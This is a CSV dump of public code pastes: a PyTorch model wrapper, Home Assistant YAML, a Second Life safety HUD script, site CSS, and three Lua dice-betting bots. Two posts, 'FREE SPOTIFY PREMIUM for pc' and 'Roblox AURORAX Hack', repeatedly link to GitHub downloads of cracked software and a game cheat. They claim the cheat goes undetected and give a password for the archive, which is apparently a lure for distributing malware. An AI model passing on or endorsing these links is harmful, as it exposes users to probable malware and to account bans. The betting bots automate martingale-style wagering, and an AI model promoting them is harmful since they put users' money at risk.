id,title,username,language,date,content
vMJVtT6n,Torchvision Model Wrapping,yusufbrima,Python,Tuesday 7th of May 2024 01:16:22 AM CDT,"import torch
import torch.nn as nn
from torchvision import models

modellist = [models.vgg19, models.resnet50, models.densenet121,models.efficientnet_b0]
modelnames = [model.__name__ for model in modellist]


class BackboneModel(nn.Module):
    def __init__(self, Backbone, n_channels=1, num_classes=10):
        super(BackboneModel, self).__init__()
        self.n_channels = n_channels
        self.num_classes = num_classes

        # Initialize backbone model
        self.model = Backbone(weights=None)

        # Modify layers based on backbone type
        if isinstance(self.model, models.vgg.VGG):
            self.modify_vgg()
        elif isinstance(self.model, models.resnet.ResNet):
            self.modify_resnet()
        elif isinstance(self.model, models.densenet.DenseNet):
            self.modify_densenet()
        elif isinstance(self.model, models.efficientnet.EfficientNet):
            self.modify_efficientnet()
        else:
            raise NotImplementedError(""Backbone type not supported."")

    def modify_vgg(self):
        # Modify first layer to accept n_channels input
        self.model.features[0] = nn.Conv2d(self.n_channels, 64, kernel_size=3, padding=1)

        # Modify classification layer
        num_features = self.model.classifier[-1].in_features
        self.model.classifier[-1] = nn.Linear(num_features, self.num_classes)

    def modify_resnet(self):
        # Modify first convolutional layer to accept n_channels input
        self.model.conv1 = nn.Conv2d(self.n_channels, 64, kernel_size=7, stride=2, padding=3, bias=False)

        # Modify classification layer
        num_features = self.model.fc.in_features
        self.model.fc = nn.Linear(num_features, self.num_classes)

    def modify_densenet(self):
        # Modify first convolutional layer to accept n_channels input
        self.model.features.conv0 = nn.Conv2d(self.n_channels, 64, kernel_size=7, stride=2, padding=3, bias=False)

        # Modify classification layer
        num_features = self.model.classifier.in_features
        self.model.classifier = nn.Linear(num_features, self.num_classes)

    def modify_efficientnet(self):
        # Modify first convolutional layer to accept n_channels input
        self.model.features[0][0] = nn.Conv2d(self.n_channels, 32, kernel_size=3, stride=2, padding=1, bias=False)

        # Modify classification layer
        num_features = self.model.classifier[-1].in_features
        self.model.classifier[-1] = nn.Linear(num_features, self.num_classes)

    def forward(self, x):
        return self.model(x)



# Example usage:
model = BackboneModel(modellist[3], n_channels=1, num_classes=10)
input_tensor = torch.randn(1, 1, 225, 225)  # Example input tensor with 1 channel
output = model(input_tensor)
print(output.shape)  # Example output shape
# print(model)"
pYhAmQsn,Untitled,anykeyev5,YAML,Tuesday 7th of May 2024 01:04:08 AM CDT,"# Automation
- alias: Offline Zigbee Devices
  id: offline_zigbee_devices
  description: Sends notification for offline Z2m devices
  trigger:
    - platform: time
      at: ""20:00:00""
  condition:
    - condition: template
      value_template: >
        {{states('sensor.z2m_last_seen_entities')|int > 0}}
  action:
    - service: notify.telegram
      data:
        title: Missing Devices
        message: >
          {% set phrase = 's are ' if states('sensor.z2m_last_seen_entities')|int > 1 else ' is ' %} 
          The following sensor{{ phrase }}missing: {{ state_attr('sensor.z2m_last_seen_entities', 'devices') | join(', ') }}
"
CJdrpqRQ,HA Sensor offline entities,anykeyev5,YAML,Tuesday 7th of May 2024 01:02:42 AM CDT,"# sensor
  - trigger:
      - platform: time_pattern
        hours: ""/1""
        minutes: 0
    sensor:
      - unique_id: z2m_last_seen_entities
        name: ""Z2M Last Seen Entities""
        state: >
          {% set lapsed_hours = 36 %}
          {% set ns = namespace(count=0) %}
          {% for state in states.sensor | selectattr('entity_id', 'search', '.*_last_seen$')  %}
            {% if states(state.entity_id) == 'unavailable' or ((as_timestamp(now()) - as_timestamp(states(state.entity_id),0)) > ((lapsed_hours | int) * 60 * 60)) %}
              {% set ns.count = ns.count + 1 %}
            {% endif %}
          {% endfor %}
          {{ ns.count }}     
        attributes:
          devices: >
            {% set lapsed_hours = 36 %}
            {% set result = namespace(sensors=[]) %}
            {% for state in states.sensor | selectattr('entity_id', 'search', '.*_last_seen$') %}
              {% if states(state.entity_id) == 'unavailable' or ((as_timestamp(now()) - as_timestamp(states(state.entity_id),0)) > ((lapsed_hours | int) * 60 * 60)) %}
                {% set result.sensors = result.sensors + [state.name | regex_replace(find='_last_seen', replace='') ~ ' (' ~ relative_time(strptime(states(state.entity_id), '%Y-%m-%dT%H:%M:%S%z', 'unavailable')) ~ ')'] %}
              {% endif %}
            {% endfor %}
            {{ result.sensors }}"
ghg4cRGu,FREE SPOTIFY PREMIUM for pc,jordanthebordan,GetText,Tuesday 7th of May 2024 12:59:26 AM CDT,"Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

Features of Spotify Premium for PC
Unlimited Music Selection
With over 60 million tracks available, Spotify Premium for PC has a vast collection of songs from various genres, languages, and artists. From the latest releases to old favorites, you can find it all on Spotify. Plus, with personalized recommendations based on your listening history and preferences, you’ll never run out of new music to discover.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

Ad-Free Listening
One of the most significant advantages of having a Premium subscription is ad-free listening. Say goodbye to those annoying interruptions and enjoy uninterrupted music streaming for hours on end.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

High-Quality Audio
Spotify Premium offers high-quality audio streaming at 320kbps, which is significantly better than the 160kbps offered in the free version. This means you can listen to your favorite songs with enhanced sound quality and clarity.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

Download and Listen Offline
With Spotify Premium, you can download your favorite tracks and listen to them offline. This is perfect for those long flights or road trips where internet connectivity may be limited or non-existent.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

Create and Share Playlists
Spotify allows users to create customized playlists with their favorite songs. You can also share your playlists with friends and discover new music through theirs. It’s a great way to expand your music library and connect with others through a shared love of music.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

Access Across Multiple Devices
With one Spotify Premium account, you can access the service on multiple devices, including desktops, laptops, smartphones, tablets, and even gaming consoles. This makes it easy to switch between devices seamlessly without interrupting your listening experience.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

MOD Features
While there are unofficial modified versions of Spotify Premium available, it is not recommended to use them. These MOD versions may offer unlimited features for free and claim to be safer than the official app.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

If you do choose to use a MOD version of Spotify Premium, some potential benefits include:
Access to all premium features without paying for a subscription
No ads during music playback
Unlimited skips and track selection

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc
"
2e9WnPMW,snowybot lua,coinwalk,JavaScript,Tuesday 7th of May 2024 12:08:49 AM CDT,"betbse        = (balance/1000)
bethigh       = false
chance        = 49.5
nextbet       = betbse
original      = balance
tens          = (betbse*10)
seventy       = (betbse*70)
twohundreds   = (betbse*50)
sevens        = (betbse*6.9)
eights        = (betbse*7.9)
setasseven    = 0
chickendinner = (balance*24000)
balance       = balance
goodoldbal    = ((math.floor(balance/tens))*tens)
badoldbal     = ((math.floor(balance/tens))*tens)
setsoftens    = 4
resetstats()
 
function dobet()       
if ((balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights)) and (not (balance==setasseven))) then
    nextbet    = previousbet*2
    setasseven = balance
end
if (((balance-(nextbet*2))<=(nextbet*24)) and (balance<(((math.floor(balance/tens))*tens)+sevens))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*2))<=(nextbet*24)) and (balance>(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*2))<=(nextbet*24)) and (balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse*2
    setasseven = balance
end
if (nextbet==null) then
    nextbet = previousbet
end 
if (balance>=chickendinner) then
print(""winner winner chicken dinner"")
stop()
end
end"
WefsrgEM,snowybot lua,coinwalk,JavaScript,Tuesday 7th of May 2024 12:03:52 AM CDT,"betbse        = (balance/1000)
bethigh       = false
chance        = 49.5
nextbet       = betbse
original      = balance
tens          = (betbse*10)
seventy       = (betbse*70)
twohundreds   = (betbse*50)
sevens        = (betbse*6.9)
eights        = (betbse*7.9)
setasseven    = 0
chickendinner = (balance*24000)
balance       = balance
goodoldbal    = ((math.floor(balance/tens))*tens)
badoldbal     = ((math.floor(balance/tens))*tens)
setsoftens    = 4
resetstats()
 
function dobet()       
if ((balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights)) and (not (balance==setasseven))) then
    nextbet    = previousbet*2
    setasseven = balance
end
if (((balance-(nextbet*2))<=(nextbet*4)) and (balance<(((math.floor(balance/tens))*tens)+sevens))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*2))<=(nextbet*24)) and (balance>(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*2))<=(nextbet*24)) and (balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse*2
    setasseven = balance
end
if (nextbet==null) then
    nextbet = previousbet
end 
if (balance>=chickendinner) then
print(""winner winner chicken dinner"")
stop()
end
end"
vwFW4LdT,snowybot lua,coinwalk,JavaScript,Monday 6th of May 2024 11:39:13 PM CDT,"betbse        = (balance/1000)
bethigh       = false
chance        = 49.5
nextbet       = betbse
original      = balance
tens          = (betbse*10)
seventy       = (betbse*70)
twohundreds   = (betbse*50)
sevens        = (betbse*6.9)
eights        = (betbse*7.9)
setasseven    = 0
chickendinner = (balance*24000)
balance       = balance
goodoldbal    = ((math.floor(balance/tens))*tens)
badoldbal     = ((math.floor(balance/tens))*tens)
setsoftens    = 4
resetstats()
 
function dobet()       
if ((balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights)) and (not (balance==setasseven))) then
    nextbet    = previousbet*2
    setasseven = balance
end
if (((balance-(nextbet*2))<=(balance/240)) and (balance<(((math.floor(balance/tens))*tens)+sevens))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*2))<=(balance/240)) and (balance>(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*4))<=(balance/240)) and (balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse*2
    setasseven = balance
end
if (((balance-(nextbet*2))<=(original/240)) and (balance<(((math.floor(balance/tens))*tens)+sevens))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*2))<=(original/240)) and (balance>(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*4))<=(original/240)) and (balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse*2
    setasseven = balance
end
if (nextbet==null) then
    nextbet = previousbet
end 
if (balance>=chickendinner) then
print(""winner winner chicken dinner"")
stop()
end
end"
4Ce1Kkpn,Roblox AURORAX Hack,jordanthebordan,GetText,Monday 6th of May 2024 10:32:05 PM CDT,"Note
Roblox AURORA X cheat is designed specifically to give players the ability to fully control the gameplay and enjoy the game without limitations. We offer an extensive set of features that can be activated and customized according to each player's preferences. Just recently we decided to make our cheat free and available to all players without exception. Thanks to our 24/7 support, we fix your problems on time and keep our cheat on top.
 
Features 🛠️:
ESP (Wallhack) - this feature of our cheat will allow you to see behind walls! You will be able to see players' names, their health, exact distance to them, the contents of crates, various lines (such as sight lines), team affiliation and much more!
AIMBOT (Aim Target) - we have implemented the best aimbot (automatic aiming) with lots of customization options. This allows each of your shots to be the last for your opponent. You can choose the target - it can be a specific body part or just precise aiming.
Misc (Tools) - our cheat also has a number of useful tools. For example, there is a function that removes weapon recoil and makes it reload faster. It is also possible to reduce ping, increase FPS by removing unnecessary objects in the scene. There are other useful features.
 
Download - https://github.com/anarxe25bearubear/licx2w
 
Tip
1. Anti-cheats (VAC, FACEIT, ESEA, BATTLEYE, EAC and many others) cannot detect our cheat.
2. Most importantly: the program is completely safe for your Windows system.
3. Support for most systems: Windows 7/8/8.1/10/11 (x32/64)
4. Password Archive - 1234
 
 
Download - https://github.com/anarxe25bearubear/licx2w"
8mLsA2vR,Child Protect,Madi_Perth,Linden Scripting,Monday 6th of May 2024 09:33:32 PM CDT,"#include ""colors.lsl""
#include ""linksetLists.lsl""

// #define DEBUG
#include ""debug.lsl""

// define default dialog buttons
list size_menu = [""Main Menu"", "" --- "", ""Done"", ""Large"", ""Medium"", ""Small""];
list main_Menu = [""Reset"", ""Safezone"", ""Done"", ""Manual"", ""Rating"", ""Size"", ""Help""];
list rate_Menu = [""Main Menu"", "" --- "", ""Done"", ""Adult"", ""Moderate"", ""General""];

// saved safezone data
vector  safe_zone_global;   // coords on grid of safezone
vector  safe_zone_regional; // coords in sim of safezone
key     safe_zone_query;    // dataquery key for safezone
string  safe_zone_name;     // region name of safezone

// default safezone data
key     default_safeQry;
vector  default_safe_global;

key     regionQry;
integer menu_Handle;
integer menu_Channel;

// list config = [""Auto"", ""MATURE"", ""Medium""];

integer hudFlags = 1;

// hud mode flags
#define AUTO  1 // Automatically TP to Safezone;

// hud size flags
integer hud_size;   // size of hud
#define SMALL   1   // small hud size
#define MEDIUM  2   // Medium hud size
#define LARGE   3   // Large hud size

// hud rating 
integer rating_score;
#define GENERAL     1   //general rating
#define MODERATE    2   // moderate rating
#define ADULT       3   // adult raiting

// misc flag variables
integer warningShown = 0;
integer soundPlayed = 0;



// has the avatar teleported to safe zone
integer tp_Flag;
#define TPPED   0x001

string getRatingLevel()
{
    string tm;
    switch (rating_score)
    {
        case ADULT:
        {
            tm = ""Adult."";
            break;
        }
        case MODERATE:
        {
            tm = ""Moderate."";
            break;
        }
        case GENERAL:
        {
            tm = ""General."";
            break;
        }
    }
    return tm;
}

// create the text for the hud size dialog
string mk_hudsize()
{
    string ts = ""Select Hud Size.\n\n\tCurrent Hud Size is "";
    switch (hud_size)
    {
        case SMALL:
        {    
            ts += ""Small"";
            break;
        }
        case MEDIUM:
        {    
            ts += ""Medium"";
            break;
        }
        case LARGE:
        {    
            ts += ""Large"";
            break;
        }
    }
    return ts += ""\n"";
}

// create the main menu text
string mk_menu()
{
    string tm = ""Main Menu:\n\n\tTeleport Mode is "";

    if (hudFlags == AUTO)
        tm += ""Auto"";
    else
        tm += ""Manual"";

    tm += ""\n\tSim Rating is "";

    switch (rating_score)
    {
        case ADULT:
        {
            tm += ""Adult."";
            break;
        }
        case MODERATE:
        {
            tm += ""Moderate."";
            break;
        }
        case GENERAL:
        {
            tm += ""General."";
            break;
        }
    }

    tm += ""\n\tCurrent Safe Zone is "";

    if(safe_zone_name != """")
        tm += safe_zone_name;
    else 
        tm += ""WelcomeHub"";

    return tm += ""\n""; 
}


// replace single list entries with 
list replaceListEntry( list entry, string  replace, string with )
{
    integer  index = llListFindList(entry, (list) replace);
    DS(""index = "" + (string) index);
    if(index == -1)
        return entry;
    else
        return llListReplaceList(entry, (list) with, index, index);
}

//Created by Ugleh Ulrik
//This sort of script should cost, but for you free :)
//Edited by Taff Nouvelle to put the buttons in correct order.
list order_buttons(list buttons)
{
    return buttons;
    // return llList2List(buttons, -3, -1) + llList2List(buttons, -6, -4) +
    //     llList2List(buttons, -9, -7) + llList2List(buttons, -12, -10);
}

default
{
    state_entry()
    {

        // cache textures
        llSetTexture(""119e28e5-1043-0dc0-864e-a403092a4c2a"", 1);
        llSetTexture(""1fb10f43-10c6-844e-fb94-a78dbc30ed9b"", 1);
        llSetTexture(""723386b5-e554-8430-d464-26d168f3aa58"", 1);
        llSetTexture(""2104d080-0e63-248a-5a90-1fb209c0d25f"", 1);
        llOwnerSay(""Press hud for 2 or more seconds for Main Menu."");

        // set the default size to medium 
        llSetLinkPrimitiveParamsFast(LINK_THIS, [PRIM_SIZE, <0.05000, 0.05000, 0.05000>]);
        hud_size = MEDIUM;

        // open channels and set basic texture
        menu_Channel = 0x80000000 | (integer)llFrand(65536) | ((integer)llFrand(65536) << 16);
        menu_Handle = llListen(menu_Channel, """", llGetOwner(), """");
        llSetTexture(""2104d080-0e63-248a-5a90-1fb209c0d25f"", ALL_SIDES);

        // load safezone if saved to linksetdata
        list    tl;
        string  ts;
        if((ts = llLinksetDataRead(""safezone"")) != """")
        {
            // parse saved safezone
            DS(ts);
            tl = llCSV2List(ts);
            safe_zone_global = (vector) llList2String(tl, 0);
            safe_zone_regional = (vector) llList2String(tl, 1);
            safe_zone_name = llList2String(tl, 2);
            DS((string) safe_zone_global);
            DS((string) safe_zone_regional);
            DS((string) safe_zone_name);                        
            
        }
        // else load default safezone
        else 
        {
            // use default WelcomeHub zone
            llOwnerSay(""No saved Safezone found.\nUsing WelcomeHub as default."");
            default_safeQry = llRequestSimulatorData(""WelcomeHub"", DATA_SIM_POS);
        }
        rating_score = 2;   // set default sim score to moderate
        // ask permission then start hud
        llRequestPermissions(llGetOwner(), PERMISSION_TELEPORT);
    }

    listen( integer channel, string name, key id, string message )
    {
        switch(message)
        {
            case ""Help"":
            {
                llGiveInventory(llGetOwner(), ""Instructions"");
                break;
            }
            // goto safezone
            case ""GO!"":
            {
                vector global;
                vector regional = <128, 128, 20>;

                if(safe_zone_name != """")
                {
                    global = safe_zone_global;
                    regional = safe_zone_regional;
                }
                else 
                {
                    global = default_safe_global;
                }

                warningShown = 1;
                llTeleportAgentGlobalCoords(llGetPermissionsKey(), 
                    global, 
                    regional, 
                    ZERO_VECTOR);
                break;

            }
            // set safezone
            case ""Safezone"":
            {
                safe_zone_name = llGetRegionName();
                safe_zone_query = llRequestSimulatorData(safe_zone_name, DATA_SIM_POS);
                llDialog(llGetOwner(), mk_menu(), main_Menu, menu_Channel);
                break;
            }
            // reset the hud
            case ""Reset"":
            {
                llDialog(llGetOwner(), ""Reset Hud? "", [""Yes"", ""No""], menu_Channel);
                break;
            }
            // answer 'Yes'to reset the hud
            case ""Yes"":
            {
                llOwnerSay(""Reseting hud and deleting data."");
                llLinksetDataReset();
                llResetScript();
                break;
            }
            // size of the hud
            case ""Size"":
            {
                llDialog(llGetOwner(), mk_hudsize(), order_buttons(size_menu), menu_Channel);
                break;
            }
            case ""Large"":
            {
                llSetLinkPrimitiveParamsFast(LINK_THIS, [PRIM_SIZE, <0.10000, 0.10000, 0.10000>]);
                hud_size = LARGE;
                llDialog(llGetOwner(), mk_hudsize(), order_buttons(size_menu), menu_Channel);
                break;
            }
            case (""Medium""):
            {
                hud_size = MEDIUM;
                llSetLinkPrimitiveParamsFast(LINK_THIS, [PRIM_SIZE, <0.05000, 0.05000, 0.05000>]);
                llDialog(llGetOwner(), mk_hudsize(), order_buttons(size_menu), menu_Channel);
                break;
            }
            case (""Small""):
            {
                hud_size = SMALL;
                llSetLinkPrimitiveParamsFast(LINK_THIS, [PRIM_SIZE, <0.10000, 0.02500, 0.02500>]);
                llDialog(llGetOwner(), mk_hudsize(), order_buttons(size_menu), menu_Channel);
                break;
            }
            // hud mode of operation
            case ""Auto"":
            {
                hudFlags =  AUTO;
                DS(""hudflags "" + (string) hudFlags );
                main_Menu = replaceListEntry(main_Menu, ""Auto"", ""Manual"");
                llDialog(llGetOwner(), mk_menu(), main_Menu, menu_Channel);
                break;
            }
            case ""Manual"":
            {
                hudFlags = 0;
                DS(""hudflags "" + (string) hudFlags );
                main_Menu = replaceListEntry(main_Menu, ""Manual"", ""Auto"");
                llDialog(llGetOwner(), mk_menu(), main_Menu, menu_Channel);
                break;
            }
            // go back to main menu
            case ""Main Menu"":
            {
                llDialog(llGetOwner(), mk_menu(), main_Menu, menu_Channel);
                break;
            }
            // ratings dialog
            case ""Rating"":
            {
                // build menu for sim rating dialog
                string ts = ""\n\n\tCurrent setting is "";
                switch (rating_score)
                {
                    case ADULT:
                    {
                        ts += ""Adult."";
                        break;
                    }
                    case MODERATE:
                    {
                        ts += ""Moderate."";
                        break;
                    }
                    case GENERAL:
                    {
                        ts += ""General."";
                        break;
                    }
                }
                ts += ""\n"";

                llDialog(llGetOwner(), ""Set Max Sim Rating"" + ts, rate_Menu, menu_Channel);
                break;
            }
            // case for selecting sim level rating
            case ""Adult"":
            {
                rating_score = ADULT;
                warningShown = 0;
                string ts = ""\n\n\tCurrent setting is "" + getRatingLevel();
                llDialog(llGetOwner(), ""Set Max Sim Rating"" + ts, rate_Menu, menu_Channel);
                
                break;
            }
            case ""Moderate"":
            {
                rating_score = MODERATE;
                warningShown = 0;
                string ts = ""\n\n\tCurrent setting is "" + getRatingLevel();
                llDialog(llGetOwner(), ""Set Max Sim Rating"" + ts, rate_Menu, menu_Channel);
                
                break;
            }
            case ""General"":
            {
                rating_score = GENERAL;
                warningShown = 0;
                string ts = ""\n\n\tCurrent setting is "" + getRatingLevel();
                llDialog(llGetOwner(), ""Set Max Sim Rating"" + ts, rate_Menu, menu_Channel);
                
                break;
            }
        }
        DS(""ratings score "" + (string) rating_score);
    }

    // ask for teleport premission 
    run_time_permissions(integer perm)
    {
        if (PERMISSION_TELEPORT & perm)
        {
            regionQry = llRequestSimulatorData(llGetRegionName(), DATA_SIM_RATING);
            llSetTimerEvent(5.0);
        }
        else 
        {
            llOwnerSay(""Hud will not function correctly without teleport premission.\nReattach hud to rest premissions."");
        }
    }

    // check to sim ratings ever 5 seconds
    timer()
    {
        regionQry = llRequestSimulatorData(llGetRegionName(), DATA_SIM_RATING);
    }

    attach( key id )
    {
        // upon attaching display basic settings 
        string ts = ""Current settings are\n"";

        if(hudFlags == AUTO)
            ts += ""\tTeleport Mode is set to Auto."";
        else 
            ts += ""\tTeleport Mode is set to Manual."";

        ts += ""\n\tCurrent Sim limit is "";
        switch (rating_score)
        {
            case ADULT:
            {
                ts += ""Adult."";
                break;
            }
            case MODERATE:
            {
                ts += ""Moderate."";
                break;
            }
            case GENERAL:
            {
                ts += ""General."";
                break;
            }
        }
        ts += ""\n\tCurrent Safezone is "";

        if(safe_zone_name != """")
            ts += safe_zone_name;
        else 
            ts += ""WelcomeHub"";

        // then request premission to tp
        if(id)
        {
            llOwnerSay(ts);  
            llRequestPermissions(llGetOwner(), PERMISSION_TELEPORT);
        } 
    }

    dataserver( key queryid, string data )
    {
        // getting the curren location when the safezone
        // button is pushed 
        if(safe_zone_query == queryid)
        {
            list tl;

            tl = llGetParcelDetails(llGetPos(), [PARCEL_DETAILS_NAME]);
            safe_zone_global = (vector) data;
            safe_zone_regional = llGetPos();
            llOwnerSay(""Safezone set to "" + safe_zone_name 
                + "", "" + llList2String(tl, 0));
            llLinksetDataWrite(""safezone"", (string) safe_zone_global +"",""+ (string) safe_zone_regional+"",""+safe_zone_name );
            DS(llLinksetDataRead(""safezone""));
        }

        // get location on grid of default safezone
        // currently the G rated WelcomeHub sim
        if(default_safeQry == queryid)
        {
            default_safe_global = (vector) data;
        }

        // set texture depending on sim rating
        // green - PG
        // blue - moderate or mature
        // red - adult (never safe)        
        if(queryid == regionQry)
        {
            integer sim_score;

            switch (data)
            {
                case (""PG""):
                {
                    sim_score = 0;
                    llSetTexture(""119e28e5-1043-0dc0-864e-a403092a4c2a"", ALL_SIDES);
                    break;
                }
                case (""MATURE""):
                {
                    sim_score = 2;
                    llSetTexture(""1fb10f43-10c6-844e-fb94-a78dbc30ed9b"", ALL_SIDES);
                    break;
                }
                default:
                {
                    sim_score = 3;
                    llSetTexture(""723386b5-e554-8430-d464-26d168f3aa58"", ALL_SIDES);
                    break;
                }
            }

            //  monitoring sim rating and tp to savezone
            // if rating exceeds safty score
            if(sim_score > rating_score)
            {

                string ts;

                if(safe_zone_name != """")
                    ts = safe_zone_name;
                else
                    ts = ""WelcomeHub"";

                if(hudFlags == AUTO && warningShown == 0)
                {
                    vector global;
                    vector regional = <128, 128, 20>;

                    DS(safe_zone_name);
                    if(safe_zone_name != """")
                    {
                        global = safe_zone_global;
                        regional = safe_zone_regional;
                    }
                    else 
                    {
                        global = default_safe_global;
                    }
                    DS((string) global);
                    DS((string) regional);
#ifndef DEBUG
                    if(llGetRegionName() != safe_zone_name || llGetRegionName() == ""WelcomeHub"")
                    {
                        llTeleportAgentGlobalCoords(llGetPermissionsKey(), 
                            global, 
                            regional, 
                            ZERO_VECTOR);
                        llDialog(llGetOwner(), 
                            ""Region Rating Surpassed Safty Settings\n\nAvatar Sent to SafeZone at "" + ts +""."", 
                            [""Ok""], menu_Channel);
                    }
#endif
                }
                else if (warningShown == 0) 
                {
                    if(llGetRegionName() != safe_zone_name && llGetRegionName() != ""WelcomeHub"")
                    { 
                        string tb = getRatingLevel();
                        llPlaySound(""d7fa8e1e-2590-bc31-08a2-5d1096231ddf"", 1.0);
                        llDialog(llGetOwner(), 
                            ""WARNING!!!! WARNING!!! WARNING!!!\n\n""+
                            ""Region Rating of "" + llGetRegionName() + "" Surpasses Safty Setting of "" + tb
                            +  ""\n\nPress \""GO!\"" buttong goto safezone at "" + ts +""."", 
                            [""GO!"" ,""Ok""], 
                            menu_Channel);
                        warningShown = 1;
                    }
                }
            }
        }
    
    }

    // hopped to a new region or crossed a regional boundry
    changed( integer change )
    {

        if(CHANGED_REGION & change)
        {
            if(!(llGetPermissions() & PERMISSION_TELEPORT))
                return;
            // region changed
            DS(""region changed"");
            warningShown = 0;
            
            regionQry = llRequestSimulatorData(llGetRegionName(), DATA_SIM_RATING);
        }
        if(CHANGED_OWNER & change)
        {
            llLinksetDataReset();
            llSay(0, ""Ownership Changed, Resetting to Default Settings."");
            llResetScript();
        }
    }


    touch_start( integer num_detected )
    {
        if(llGetPermissions() & PERMISSION_TELEPORT)
            llResetTime();
    }

    // open menu
    touch( integer num_detected )
    {
        if(!(llGetPermissions() & PERMISSION_TELEPORT))
            return;
        if(llGetTime() > 2 && soundPlayed == 0)
        {
            llPlaySound(""d23c9120-ba77-6c69-5ee1-0529b6e6ad5d"", 1);
            soundPlayed = 1;
            llDialog(llGetOwner(), mk_menu(), main_Menu, menu_Channel);
        }
    }

    // panic button pushed taking to safe zone
    touch_end( integer num )
    {
        if(!(llGetPermissions() & PERMISSION_TELEPORT))
            return;
        
        soundPlayed = 0;

        if(llGetTime() < 2)
        {
            vector global;
            vector regional = <128, 128, 20>;
            // panic botton pushed
            llOwnerSay(""Panic Botton Pressed, taking to safe zone."");
            DS(safe_zone_name);
            if(safe_zone_name != """")
            {
                global = safe_zone_global;
                regional = safe_zone_regional;
            }
            else 
            {
                global = default_safe_global;
            }
            DS((string) global);
            DS((string) regional);
#ifndef DEBUG

            llTeleportAgentGlobalCoords(llGetPermissionsKey(), 
            global, 
            regional, 
            ZERO_VECTOR);
           
#endif
        }
    }
}
"
czV1J38B,Everskies CSS *Extras!*,lemontreess,CSS,Monday 6th of May 2024 09:25:48 PM CDT,"/*all attached images are smaller!*/ 
img.attached{
   max-width: 500px !important;
}
/*Bigger text!*/
.ng-star-inserted{
   font-size: 15px;
}
/* images in quotes are even smaller + faded text!*/
blockquote .ng-star-inserted{
   color: #cececea7 !important;
   max-width: 200px !important;
}
/*Changer for all symbol colors*/
I.mdi{
   color: #000000 !important;
}
/* ENTIRE site color editor (allows you to change site theme to other colors than default dark or light!) A little experimental and might not effect everything, lemme know on reddit if it doesn't work in certain places and I'll fix the code!*/
.box-shadow, .rounded, .bg1, .bg0, .list{
   background: #000000 !important;
   border: #000000 !important;
}
/* Gradiant colors for personal theme!*/
.bg5, .b5, div.box-title{
   background-image: linear-gradient(to right, #a663a6, #9bccd5) !important;
   border: #000000 !important;
}
"
